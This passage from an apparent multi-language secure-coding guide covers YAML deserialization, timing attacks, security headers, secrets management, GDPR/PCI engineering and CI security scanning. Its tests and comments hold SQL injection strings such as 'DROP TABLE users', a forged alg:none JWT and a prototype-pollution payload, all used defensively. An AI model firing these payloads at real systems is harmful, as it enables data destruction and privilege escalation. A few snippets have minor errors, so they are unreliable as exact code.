# ─── YAML deserialization (RCE risk) ───────────────────────────────────────
import yaml

# UNSAFE: yaml.load with full loader
data = yaml.load(user_input)  # Can execute Python code

# SAFE: Always use SafeLoader
data = yaml.safe_load(user_input)
# or
data = yaml.load(user_input, Loader=yaml.SafeLoader)

# ─── Timing Attacks in comparison ──────────────────────────────────────────
import hmac

# UNSAFE: Direct string comparison is not constant-time
# Attackers measure response time to guess secret character by character
if token == expected_token:  # Early exit reveals information!
    ...

# SAFE: Constant-time comparison
if hmac.compare_digest(token.encode(), expected_token.encode()):
    ...

# ─── Regex ReDoS (Denial of Service) ────────────────────────────────────────
import re, regex

# UNSAFE: Vulnerable regex pattern + long input = catastrophic backtracking
# Pattern (a+)+ applied to "aaaaaaaaaaaaaaaaaaaab" → exponential time
re.match(r'^(a+)+$', 'a' * 30 + 'b')  # HANGS THE SERVER

# SAFE: Use timeout with multiprocessing or use Google's re2 via 'regex' library
pattern = regex.compile(r'^(a+)+$', regex.VERSION1 | regex.TIMEOUT)
# Or simply avoid ambiguous quantifiers and use specific patterns
```

### 14.3 Python Dependency Security

```bash
# Install safety scanner
pip install safety

# Check dependencies against known CVE database
safety check --full-report

# Use pip-audit (official PyPA tool)
pip install pip-audit
pip-audit

# requirements.txt — pin exact versions and include hashes
# Generate: pip-compile --generate-hashes requirements.in
cryptography==41.0.7 \
    --hash=sha256:abc123... \
    --hash=sha256:def456...

# Use .env file for local development, never commit it
# In production: load from Vault, AWS Secrets Manager, or env vars set by K8s
```

---

## Chapter 15: Go Security

### 15.1 Go HTTP Server — Secure Defaults

```go
package main

import (
    "context"
    "net/http"
    "time"
)

func NewSecureServer(handler http.Handler) *http.Server {
    return &http.Server{
        Handler:           handler,
        Addr:              ":8443",
        ReadTimeout:       10 * time.Second,  // Prevent Slowloris
        WriteTimeout:      30 * time.Second,
        IdleTimeout:       120 * time.Second,
        ReadHeaderTimeout: 5 * time.Second,   // Prevent slow header attacks
        MaxHeaderBytes:    1 << 20,           // 1 MB max headers

        TLSConfig: &tls.Config{
            MinVersion:               tls.VersionTLS12,
            PreferServerCipherSuites: true,
            CurvePreferences: []tls.CurveID{
                tls.X25519,
                tls.CurveP256,
            },
            CipherSuites: []uint16{
                tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
                tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
                tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
                tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
            },
        },
    }
}

// Security middleware chain
func SecurityMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // Security headers
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
        w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
        w.Header().Set("Permissions-Policy", "geolocation=(), microphone=()")

        // Remove server fingerprinting
        w.Header().Del("Server")

        // Request size limit
        r.Body = http.MaxBytesReader(w, r.Body, 10*1024*1024) // 10 MB

        next.ServeHTTP(w, r)
    })
}
```

### 15.2 Go — Memory Safety and Security

Go is memory-safe by design — no buffer overflows, no use-after-free. But several Go-specific patterns introduce security risks:

```go
// ─── Race Conditions (concurrent data corruption) ──────────────────────────
// UNSAFE: Map is not safe for concurrent read/write
var cache = map[string]User{}

func SetCache(key string, user User) {
    cache[key] = user  // DATA RACE if called concurrently
}

// SAFE: Use sync.Map or RWMutex
import "sync"

var (
    cache   = make(map[string]User)
    cacheMu sync.RWMutex
)

func SetCache(key string, user User) {
    cacheMu.Lock()
    defer cacheMu.Unlock()
    cache[key] = user
}

func GetCache(key string) (User, bool) {
    cacheMu.RLock()
    defer cacheMu.RUnlock()
    u, ok := cache[key]
    return u, ok
}

// Detect races at test time: go test -race ./...

// ─── Integer Overflow ─────────────────────────────────────────────────────
// Go doesn't panic on integer overflow — it wraps silently
// In security contexts (length calculations, index arithmetic), check explicitly:

func safeAdd(a, b int64) (int64, error) {
    if a > 0 && b > math.MaxInt64-a {
        return 0, errors.New("integer overflow")
    }
    if a < 0 && b < math.MinInt64-a {
        return 0, errors.New("integer underflow")
    }
    return a + b, nil
}

// ─── Cryptographically secure random numbers ─────────────────────────────
import (
    "crypto/rand"
    "math/big"
)

// UNSAFE: math/rand is a PRNG — predictable if seed is known
// import "math/rand"
// n := rand.Intn(100)  // NEVER for security purposes

// SAFE: crypto/rand for all security-sensitive random numbers
func GenerateSecureToken(length int) (string, error) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    result := make([]byte, length)
    for i := range result {
        n, err := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
        if err != nil { return "", err }
        result[i] = chars[n.Int64()]
    }
    return string(result), nil
}
```

---

## Chapter 16: Rust Security

### 16.1 Why Rust Is Different

Rust's ownership model eliminates entire vulnerability classes at compile time:
- **Buffer overflows**: Impossible without `unsafe` — bounds checking by default
- **Use-after-free**: Ownership guarantees no dangling references
- **Data races**: The borrow checker prevents concurrent mutable access
- **Null pointer dereferences**: `Option<T>` forces explicit null handling

This doesn't make Rust code automatically secure — logic flaws, injection, and poor cryptography are still possible. But the memory safety layer is gone as an attack surface.

```rust
// ─── unsafe blocks — the exception, not the rule ──────────────────────────
// Every unsafe block is a promise to the compiler:
// "I have verified this is correct; you don't need to check"
// Keep unsafe blocks minimal, documented, and audited

// ACCEPTABLE: interop with C FFI
extern "C" {
    fn some_c_function(ptr: *const u8, len: usize) -> i32;
}

unsafe fn call_c_safely(data: &[u8]) -> i32 {
    // JUSTIFIED: We know this C function's contract
    // Document invariants:
    // - ptr must be valid for `len` bytes
    // - data must not be mutated during the call
    some_c_function(data.as_ptr(), data.len())
}

// NOT ACCEPTABLE: Bypassing Rust's safety for convenience
let s = unsafe { String::from_utf8_unchecked(bytes) }; // ← Check utf8 first!
// Use the safe version instead:
let s = String::from_utf8(bytes).map_err(|e| anyhow!("Invalid UTF-8: {}", e))?;

// ─── Axum web framework — secure configuration ────────────────────────────
use axum::{
    extract::State,
    http::{HeaderMap, StatusCode},
    middleware::{self, Next},
    response::{IntoResponse, Response},
    routing::get,
    Router,
};
use tower_http::{
    limit::RequestBodyLimitLayer,
    timeout::TimeoutLayer,
    set_header::SetResponseHeaderLayer,
    cors::CorsLayer,
};

pub fn create_router(state: AppState) -> Router {
    Router::new()
        .route("/api/users", get(list_users).post(create_user))
        .layer(
            // Security middleware stack
            tower::ServiceBuilder::new()
                .layer(TimeoutLayer::new(Duration::from_secs(30)))
                .layer(RequestBodyLimitLayer::new(10 * 1024 * 1024)) // 10MB
                .layer(
                    CorsLayer::new()
                        .allow_origin("https://app.example.com".parse::<HeaderValue>().unwrap())
                        .allow_methods([Method::GET, Method::POST, Method::PUT, Method::DELETE])
                        .allow_headers([AUTHORIZATION, CONTENT_TYPE])
                        .allow_credentials(true)
                )
                .layer(SetResponseHeaderLayer::overriding(
                    header::X_CONTENT_TYPE_OPTIONS,
                    HeaderValue::from_static("nosniff"),
                ))
                .layer(middleware::from_fn(security_headers_middleware))
        )
        .with_state(state)
}

async fn security_headers_middleware(
    req: axum::http::Request<axum::body::Body>,
    next: Next,
) -> Response {
    let mut response = next.run(req).await;
    let headers = response.headers_mut();
    headers.insert("X-Frame-Options", HeaderValue::from_static("DENY"));
    headers.insert(
        "Strict-Transport-Security",
        HeaderValue::from_static("max-age=31536000; includeSubDomains"),
    );
    headers.remove("server"); // Remove fingerprinting
    response
}
```

### 16.2 Rust — Input Validation with Types

Rust's type system enforces security invariants at compile time:

```rust
// Use newtype pattern to encode security constraints in the type system
use validator::Validate;
use serde::{Deserialize, Serialize};
use zeroize::Zeroizing;

// A validated, sanitized email — cannot be created without validation
#[derive(Debug, Clone, Serialize)]
pub struct ValidatedEmail(String);

impl ValidatedEmail {
    pub fn new(raw: &str) -> Result<Self, ValidationError> {
        let trimmed = raw.trim().to_lowercase();
        if trimmed.len() > 254 {
            return Err(ValidationError::new("email_too_long"));
        }
        if !email_regex().is_match(&trimmed) {
            return Err(ValidationError::new("invalid_email_format"));
        }
        Ok(ValidatedEmail(trimmed))
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

// Sensitive data that is zeroed from memory when dropped
// Prevents secrets from lingering in memory after use
pub struct Password(Zeroizing<String>);

impl Password {
    pub fn new(raw: String) -> Self {
        Password(Zeroizing::new(raw))
    }
}
// When Password is dropped, the memory is zeroed — mitigates memory scraping attacks

// Compile-time UUID validation through type
use uuid::Uuid;
pub struct UserId(Uuid);

impl UserId {
    pub fn parse(s: &str) -> Result<Self, uuid::Error> {
        Uuid::parse_str(s).map(UserId) // Compile error if you try to bypass
    }
}
// UserId can only contain valid UUIDs — invalid values cannot be constructed
```

---

## Chapter 17: TypeScript / Node.js Security

### 17.1 Express.js / Fastify — Secure Configuration

```typescript
import express, { Request, Response, NextFunction } from 'express';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import mongoSanitize from 'express-mongo-sanitize';
import cors from 'cors';
import cookieParser from 'cookie-parser';
import csrf from 'csurf';

const app = express();

// ─── Helmet — sets 14 security headers automatically ─────────────────────
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'none'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'"],
            imgSrc: ["'self'", "data:"],
            connectSrc: ["'self'", "https://api.example.com"],
            fontSrc: ["'self'"],
            frameSrc: ["'none'"],
            formAction: ["'self'"],
            baseUri: ["'self'"],
        },
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true,
    },
    frameguard: { action: 'deny' },
    noSniff: true,
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));

// ─── CORS — never use origin: "*" with credentials ─────────────────────
app.use(cors({
    origin: 'https://app.example.com',  // Exact origin; no wildcards
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    maxAge: 3600,
}));

// ─── Body parser with size limits ────────────────────────────────────────
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ─── Prevent NoSQL injection (MongoDB) ──────────────────────────────────
app.use(mongoSanitize()); // Strips $ and . from req.body, req.params, req.query

// ─── Rate limiting ───────────────────────────────────────────────────────
const globalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100,
    standardHeaders: true,
    legacyHeaders: false,
    skipSuccessfulRequests: false,
});

const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5,                        // 5 login attempts per 15 min
    skipSuccessfulRequests: false, // Count successful logins too
    handler: (req, res) => {
        res.status(429).json({ error: 'Too many login attempts' });
    },
});

app.use(globalLimiter);
app.use('/api/auth/login', authLimiter);

// ─── CSRF Protection (for session-based apps) ───────────────────────────
app.use(cookieParser());
const csrfProtection = csrf({
    cookie: {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
    },
});
app.use('/api/', csrfProtection); // Apply to all state-changing routes
```

### 17.2 TypeScript — Type-Safe Security

```typescript
// ─── Zod schema validation — validate at the boundary ────────────────────
import { z } from 'zod';

const CreateUserSchema = z.object({
    email: z.string()
        .email("Invalid email format")
        .max(254, "Email too long")
        .toLowerCase()
        .trim(),
    password: z.string()
        .min(12, "Password must be at least 12 characters")
        .regex(/[A-Z]/, "Must contain uppercase letter")
        .regex(/[0-9]/, "Must contain number")
        .regex(/[^a-zA-Z0-9]/, "Must contain special character"),
    role: z.enum(['user', 'editor']), // Whitelist — 'admin' cannot be set by users
});

type CreateUserInput = z.infer<typeof CreateUserSchema>;

app.post('/api/users', async (req: Request, res: Response) => {
    const parsed = CreateUserSchema.safeParse(req.body);
    if (!parsed.success) {
        return res.status(400).json({ errors: parsed.error.flatten() });
    }
    const validatedData: CreateUserInput = parsed.data; // Fully type-safe
    await userService.create(validatedData);
});

// ─── Preventing Prototype Pollution ─────────────────────────────────────
// Attack: req.body = { "__proto__": { "isAdmin": true } }
// If merged into an object: ({}).isAdmin === true for ALL objects

// SAFE: Use Object.create(null) for key-value stores
const safeMap = Object.create(null) as Record<string, unknown>;
// No prototype — __proto__ pollution impossible

// Or use structuredClone to safely copy without prototype
const safeClone = (obj: unknown): unknown =>
    JSON.parse(JSON.stringify(obj)); // Also safe but loses non-JSON types

// Libraries: use deepmerge with { isMergeableObject } or lodash.mergeWith
// with prototype check:
import { mergeWith } from 'lodash';
const safeMerge = (target: object, source: object) =>
    mergeWith(target, source, (_, srcVal) => {
        if (Array.isArray(srcVal)) return srcVal;
        if (srcVal === null || typeof srcVal !== 'object') return srcVal;
        if (srcVal.constructor !== Object) return srcVal; // Block non-plain objects
    });

// ─── Security-relevant environment variables ─────────────────────────────
import { cleanEnv, str, num, bool } from 'envalid';

const env = cleanEnv(process.env, {
    NODE_ENV:   str({ choices: ['development', 'test', 'production'] }),
    JWT_SECRET: str({ docs: 'Must be at least 256 bits; generate with: openssl rand -hex 32' }),
    DATABASE_URL: str(),
    PORT:       num({ default: 8080 }),
    HTTPS_ENABLED: bool({ default: false }),
});
// Validates all required env vars at startup; fails fast if any are missing
```

---

# PART 5 — SECURITY HEADERS, CORS, AND HTTP HARDENING

---

## Chapter 18: Complete Security Headers Reference

Every HTTP response should carry security headers. Here is the definitive reference:

```
HEADER                           VALUE                              PURPOSE
─────────────────────────────────────────────────────────────────────────────
Content-Security-Policy          default-src 'none'; ...           XSS, data injection
Strict-Transport-Security        max-age=31536000; includeSubDomains; preload
                                                                   HTTPS enforcement
X-Content-Type-Options           nosniff                           MIME sniffing
X-Frame-Options                  DENY                              Clickjacking
Referrer-Policy                  strict-origin-when-cross-origin   Referrer leakage
Permissions-Policy               geolocation=(), microphone=()     Feature restrictions
Cache-Control                    no-store (for auth responses)     Sensitive data caching
Clear-Site-Data                  "cache", "cookies" (on logout)    Session cleanup
Cross-Origin-Opener-Policy       same-origin                       Spectre isolation
Cross-Origin-Embedder-Policy     require-corp                      Spectre isolation
Cross-Origin-Resource-Policy     same-origin                       Resource isolation

Headers to REMOVE:
Server                           (remove entirely)                 Server fingerprinting
X-Powered-By                     (remove entirely)                 Technology disclosure
X-AspNet-Version                 (remove entirely)                 Version disclosure
```

```typescript
// Universal security headers middleware (works with any Node.js framework)
export function securityHeaders(
    req: Request,
    res: Response,
    next: NextFunction
): void {
    const headers: Record<string, string> = {
        // Prevent MIME type sniffing
        'X-Content-Type-Options': 'nosniff',

        // Prevent clickjacking (superseded by CSP frame-ancestors, but belt-and-suspenders)
        'X-Frame-Options': 'DENY',

        // HSTS — tell browser to always use HTTPS for 1 year
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',

        // Limit referrer information
        'Referrer-Policy': 'strict-origin-when-cross-origin',

        // Disable browser features you don't use
        'Permissions-Policy': [
            'geolocation=()',
            'microphone=()',
            'camera=()',
            'payment=()',
            'usb=()',
            'interest-cohort=()', // Opt out of FLoC
        ].join(', '),

        // Cross-origin isolation for Spectre mitigations
        'Cross-Origin-Opener-Policy':   'same-origin',
        'Cross-Origin-Embedder-Policy': 'require-corp',
        'Cross-Origin-Resource-Policy': 'same-origin',
    };

    // CSP with nonce for inline scripts (generate fresh per request)
    const nonce = crypto.randomBytes(16).toString('base64');
    res.locals.cspNonce = nonce; // Available in templates

    headers['Content-Security-Policy'] = [
        "default-src 'none'",
        `script-src 'self' 'nonce-${nonce}'`,
        "style-src 'self' 'unsafe-inline'",       // Allow inline CSS
        "img-src 'self' data: https:",
        "font-src 'self'",
        `connect-src 'self' ${process.env.API_URL}`,
        "frame-src 'none'",
        "form-action 'self'",
        "base-uri 'self'",
        "frame-ancestors 'none'",
        "upgrade-insecure-requests",
    ].join('; ');

    for (const [key, value] of Object.entries(headers)) {
        res.setHeader(key, value);
    }

    // Remove fingerprinting headers
    res.removeHeader('X-Powered-By');
    res.removeHeader('Server');

    next();
}
```

---

## Chapter 19: Secrets Management

### 19.1 The Hierarchy of Secret Storage Safety

```
SAFETY LEVEL    METHOD                          NOTES
─────────────────────────────────────────────────────────────────────────
Safest          HSM (Hardware Security Module) / KMS
                AWS KMS, Azure Key Vault, GCP KMS, HashiCorp Vault
                Secret never leaves the HSM; all operations done inside

Excellent       Kubernetes Secrets + external-secrets operator
                or Vault Agent Injector
                Secrets injected at pod startup, not stored in code

Good            Environment variables set by secret manager at deploy time
                (not .env files committed to git)

Acceptable      Encrypted secret store (SOPS + age/PGP)
                Config files encrypted at rest, decrypted in CI/CD only

BAD             .env files in git (even private repos)
                                 — employees leave, forks happen

CRITICAL FAIL   Hardcoded in source code
                Database passwords in application.properties
                AWS keys in code committed to GitHub
```

```python
# Python — Loading secrets from HashiCorp Vault
import hvac
import os
from functools import lru_cache

@lru_cache(maxsize=None)
def get_vault_client() -> hvac.Client:
    client = hvac.Client(
        url=os.environ["VAULT_ADDR"],
        # Kubernetes auth: pod's service account token authenticates to Vault
        token=open("/var/run/secrets/kubernetes.io/serviceaccount/token").read()
            if os.path.exists("/var/run/secrets/kubernetes.io/serviceaccount/token")
            else os.environ.get("VAULT_TOKEN")
    )
    if not client.is_authenticated():
        raise RuntimeError("Vault authentication failed")
    return client

def get_secret(path: str, key: str) -> str:
    """Fetch a specific secret from Vault KV v2 store"""
    client = get_vault_client()
    secret = client.secrets.kv.v2.read_secret_version(
        path=path,
        mount_point="secret"
    )
    return secret["data"]["data"][key]

# Usage: database password comes from Vault, not from os.environ
DB_PASSWORD = get_secret("myapp/database", "password")
```

```go
// Go — AWS Secrets Manager integration
package secrets

import (
    "context"
    "encoding/json"
    "sync"
    "time"

    "github.com/aws/aws-sdk-go-v2/aws"
    "github.com/aws/aws-sdk-go-v2/service/secretsmanager"
)

type SecretsCache struct {
    client  *secretsmanager.Client
    cache   map[string]cachedSecret
    mu      sync.RWMutex
    ttl     time.Duration
}

type cachedSecret struct {
    value     map[string]string
    expiresAt time.Time
}

func (s *SecretsCache) GetSecret(ctx context.Context, secretID string) (map[string]string, error) {
    s.mu.RLock()
    cached, ok := s.cache[secretID]
    s.mu.RUnlock()

    if ok && time.Now().Before(cached.expiresAt) {
        return cached.value, nil // Return cached version
    }

    // Fetch from Secrets Manager
    result, err := s.client.GetSecretValue(ctx, &secretsmanager.GetSecretValueInput{
        SecretId: aws.String(secretID),
    })
    if err != nil {
        return nil, err
    }

    var secretMap map[string]string
    if err := json.Unmarshal([]byte(*result.SecretString), &secretMap); err != nil {
        return nil, err
    }

    s.mu.Lock()
    s.cache[secretID] = cachedSecret{
        value:     secretMap,
        expiresAt: time.Now().Add(s.ttl), // Re-fetch periodically for rotation support
    }
    s.mu.Unlock()

    return secretMap, nil
}
```

### 19.2 Detecting Leaked Secrets in CI/CD

```yaml
# GitHub Actions — secret scanning with gitleaks
name: Secret Scan
on: [push, pull_request]

jobs:
  secret-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Full history for scanning all commits

      - name: Gitleaks Scan
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          config-path: .gitleaks.toml  # Custom rules

      - name: TruffleHog Scan (deep git history)
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD
          extra_args: --debug --only-verified
```

```toml
# .gitleaks.toml — custom secret patterns for your organization
[allowlist]
paths = [
    '''(^|/)\.env\.example$''',
    '''(^|/)test/fixtures/''',
]

[[rules]]
id          = "internal-api-key"
description = "Company internal API key pattern"
regex       = '''INTERNAL_[A-Z]+_[0-9a-f]{32}'''
severity    = "CRITICAL"

[[rules]]
id          = "aws-key-custom"
description = "AWS access key"
regex       = '''AKIA[0-9A-Z]{16}'''
severity    = "CRITICAL"
```

---

# PART 6 — COMPLIANCE AND PRIVACY BY DESIGN

---

## Chapter 20: GDPR — Engineering Requirements

GDPR (General Data Protection Regulation) is not a legal document to be handled by compliance officers alone. It imposes direct engineering requirements on how you build systems.

### 20.1 The Engineering Obligations

```
GDPR REQUIREMENT         ENGINEERING IMPLEMENTATION
──────────────────────────────────────────────────────────────────────────────
Data Minimization        Collect only fields needed; explicit schema review
                         for each data type collected

Purpose Limitation       Tag data by purpose; prevent queries across purposes

Storage Limitation       TTL on all personal data; automated deletion jobs

Accuracy                 Validation at ingestion; correction endpoints

Security of Processing   Encryption at rest + in transit; access controls;
                         audit logging; breach detection

Right to Access          /api/users/me/export endpoint; complete PII export
                         in machine-readable format within 30 days

Right to Erasure         /api/users/me → DELETE endpoint; cascading deletion
("Right to be Forgotten") across all data stores including backups, logs, caches

Portability              Export in open format (JSON, CSV); not vendor-specific
                         formats

Consent Management       Consent recorded with timestamp, purpose, version of
                         privacy policy; consent withdrawal supported
```

### 20.2 GDPR Data Flow Mapping

```python
# Python — data classification model for GDPR compliance
from enum import Enum
from dataclasses import dataclass
from typing import Optional, Set

class DataCategory(Enum):
    GENERAL          = "general"          # Name, email — standard protection
    SENSITIVE        = "sensitive"        # Health, biometric, financial — enhanced protection
    SPECIAL_CATEGORY = "special_category" # Article 9 data (race, religion, health, etc.)

class LegalBasis(Enum):
    CONSENT               = "consent"
    CONTRACT              = "contract"
    LEGAL_OBLIGATION      = "legal_obligation"
    VITAL_INTERESTS       = "vital_interests"
    PUBLIC_TASK           = "public_task"
    LEGITIMATE_INTERESTS  = "legitimate_interests"

@dataclass
class PersonalDataField:
    field_name:    str
    category:      DataCategory
    legal_basis:   LegalBasis
    retention_days: int
    purpose:       str
    encrypted:     bool = True
    pseudonymized: bool = False

# Data register — every PII field documented
USER_DATA_REGISTER = [
    PersonalDataField("email",        DataCategory.GENERAL,    LegalBasis.CONTRACT,  3650, "authentication"),
    PersonalDataField("ip_address",   DataCategory.GENERAL,    LegalBasis.LEGITIMATE_INTERESTS, 90, "fraud_prevention"),
    PersonalDataField("location",     DataCategory.GENERAL,    LegalBasis.CONSENT,  365,  "personalization"),
    PersonalDataField("health_data",  DataCategory.SPECIAL_CATEGORY, LegalBasis.CONSENT, 3650, "service_delivery", encrypted=True),
]

# Automated data deletion job
from sqlalchemy import text
from datetime import datetime, timedelta

async def run_retention_cleanup(db: AsyncSession):
    """Execute GDPR retention policy — run daily as a cron job"""
    for field_def in USER_DATA_REGISTER:
        cutoff = datetime.utcnow() - timedelta(days=field_def.retention_days)
        if field_def.category == DataCategory.GENERAL:
            await db.execute(text(f"""
                UPDATE users SET {field_def.field_name} = NULL
                WHERE created_at < :cutoff AND {field_def.field_name} IS NOT NULL
            """), {"cutoff": cutoff})
    await db.commit()
```

### 20.3 PCI DSS for Payment Developers

PCI DSS v4.0 applies to any system that stores, processes, or transmits cardholder data.

```
RULE                        IMPLEMENTATION
──────────────────────────────────────────────────────────────────────────────
Never store full PAN after  Use tokenization (Stripe token, Braintree vault)
authorization               Never log card numbers; mask in logs as 4111XXXXXXXX1111

Encrypt cardholder data     AES-256 encryption; key managed by HSM/KMS
                            Separate key management from data storage

Restrict network access     Cardholder Data Environment (CDE) in isolated VPC
                            No direct internet access to CDE

Audit logging               Log all access to cardholder data
                            Log access attempts, modifications, deletions
                            Retain logs for 12 months; online for 3 months

Secure development          SAST/DAST in CI pipeline
                            Code review for payment-related changes
                            Developer security training

Penetration testing         Annual pen test + quarterly vulnerability scans
                            Scope must include all CDE systems
```

```typescript
// TypeScript — PCI-compliant payment handling
// NEVER handle raw card numbers in your application
// Always use a PCI-compliant payment processor (Stripe, Braintree)

import Stripe from 'stripe';

const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!, {
    apiVersion: '2024-06-20',
    typescript: true,
});

// ✅ CORRECT: Card data never touches your server
// Stripe.js tokenizes on the client before sending to your API
export async function createPaymentIntent(
    amount: number,   // in cents
    customerId: string,
): Promise<string> {
    const paymentIntent = await stripe.paymentIntents.create({
        amount,
        currency: 'usd',
        customer: customerId,
        // metadata for audit trail (no card data)
        metadata: {
            created_by: 'checkout_flow',
            created_at: new Date().toISOString(),
        },
    });

    return paymentIntent.client_secret!;
    // Client uses client_secret to complete payment — card data never hits your server
}

// Webhook signature validation — critical for payment integrity
export async function handleStripeWebhook(
    rawBody: Buffer,
    signature: string,
): Promise<void> {
    let event: Stripe.Event;
    try {
        event = stripe.webhooks.constructEvent(
            rawBody,
            signature,
            process.env.STRIPE_WEBHOOK_SECRET!
        );
        // constructEvent verifies the HMAC signature
        // Prevents attackers from forging payment success events
    } catch (err) {
        throw new Error(`Webhook signature verification failed: ${err.message}`);
    }

    switch (event.type) {
        case 'payment_intent.succeeded':
            await handlePaymentSuccess(event.data.object as Stripe.PaymentIntent);
            break;
        case 'payment_intent.payment_failed':
            await handlePaymentFailure(event.data.object as Stripe.PaymentIntent);
            break;
    }
}
```

---

## Chapter 21: Zero-Bug Security — Static Analysis and Testing

### 21.1 SAST Integration by Language

```yaml
# GitHub Actions — comprehensive security pipeline
name: Security Pipeline
on: [push, pull_request]

jobs:
  # ─── SAST ─────────────────────────────────────────────────────────────────
  sast-python:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Bandit (Python SAST)
        run: |
          pip install bandit[toml]
          bandit -r ./src -f json -o bandit-report.json \
            -ll -ii  # High severity + high confidence only
      - name: Semgrep
        uses: semgrep/semgrep-action@v1
        with:
          config: >-
            p/python
            p/owasp-top-ten
            p/jwt
            p/secrets
            p/sql-injection

  sast-java:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: SpotBugs + Find Security Bugs
        run: mvn spotbugs:check -Dspotbugs.pluginList=findsecbugs-plugin

  sast-go:
    runs-on: ubuntu-latest
    steps:
      - name: gosec
        uses: securego/gosec@master
        with:
          args: '-exclude-dir=vendor ./...'
      - name: govulncheck
        run: |
          go install golang.org/x/vuln/cmd/govulncheck@latest
          govulncheck ./...

  sast-rust:
    runs-on: ubuntu-latest
    steps:
      - name: cargo-audit
        run: cargo audit
      - name: cargo-clippy (security lints)
        run: cargo clippy -- -D clippy::all -D clippy::pedantic -D clippy::security

  sast-typescript:
    runs-on: ubuntu-latest
    steps:
      - name: ESLint security plugin
        run: |
          npm install -g eslint eslint-plugin-security @typescript-eslint/parser
          eslint --ext .ts,.tsx src/ --rule '{"security/detect-object-injection": "error"}'

  # ─── Dependency Scanning ──────────────────────────────────────────────────
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Trivy (all ecosystems)
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'  # Fail pipeline on CRITICAL findings

  # ─── Secret Scanning ─────────────────────────────────────────────────────
  secret-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - uses: gitleaks/gitleaks-action@v2

  # ─── Container Scanning ──────────────────────────────────────────────────
  container-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Build image
        run: docker build -t myapp:${{ github.sha }} .
      - name: Trivy container scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:${{ github.sha }}'
          format: 'sarif'
          severity: 'CRITICAL'
          exit-code: '1'
```

### 21.2 Security Unit Tests

Every security control must have a corresponding automated test. Security tests are not optional.

```python
# Python — Security-focused pytest tests
import pytest
from httpx import AsyncClient
from app.main import app

class TestSQLInjection:
    @pytest.mark.parametrize("payload", [
        "1 OR 1=1",
        "1; DROP TABLE users;--",
        "' OR '1'='1",
        "1 UNION SELECT password FROM users--",
    ])
    async def test_sql_injection_rejected(self, payload: str, client: AsyncClient):
        response = await client.get(f"/api/users/{payload}")
        # Should return 422 (validation error) or 404 (not found by ID)
        # Should NOT return 200 with user data (injection succeeded)
        assert response.status_code in (400, 404, 422)
        assert "password" not in response.text.lower()

class TestAuthorizationControls:
    async def test_idor_prevented(self, client: AsyncClient, user_a_token: str, user_b_id: int):
        """User A cannot access User B's private data"""
        response = await client.get(
            f"/api/users/{user_b_id}/profile",
            headers={"Authorization": f"Bearer {user_a_token}"}
        )
        assert response.status_code in (403, 404)

    async def test_unauthenticated_access_rejected(self, client: AsyncClient):
        """Protected endpoints require authentication"""
        response = await client.get("/api/users/me")
        assert response.status_code == 401

    async def test_role_escalation_prevented(
        self, client: AsyncClient, regular_user_token: str
    ):
        """Regular users cannot access admin endpoints"""
        response = await client.get(
            "/api/admin/users",
            headers={"Authorization": f"Bearer {regular_user_token}"}
        )
        assert response.status_code == 403

class TestJWTSecurity:
    async def test_alg_none_rejected(self, client: AsyncClient):
        """System rejects JWT with alg:none"""
        # Craft alg:none token manually
        header  = base64url_encode('{"alg":"none","typ":"JWT"}')
        payload = base64url_encode('{"sub":"admin","role":"admin","exp":9999999999}')
        token   = f"{header}.{payload}."  # Empty signature
        response = await client.get(
            "/api/users/me",
            headers={"Authorization": f"Bearer {token}"}
        )
        assert response.status_code == 401

    async def test_expired_token_rejected(self, client: AsyncClient):
        """Expired JWT is rejected"""
        expired_token = create_token("user_1", "user", expires_delta=-1)
        response = await client.get(
            "/api/users/me",
            headers={"Authorization": f"Bearer {expired_token}"}
        )
        assert response.status_code == 401

class TestRateLimiting:
    async def test_login_rate_limited(self, client: AsyncClient):
        """Login endpoint enforces rate limiting"""
        for _ in range(6):  # 5 allowed + 1 over limit
            response = await client.post("/api/auth/login", json={
                "email": "user@example.com",
                "password": "wrongpassword"
            })
        assert response.status_code == 429

class TestSecurityHeaders:
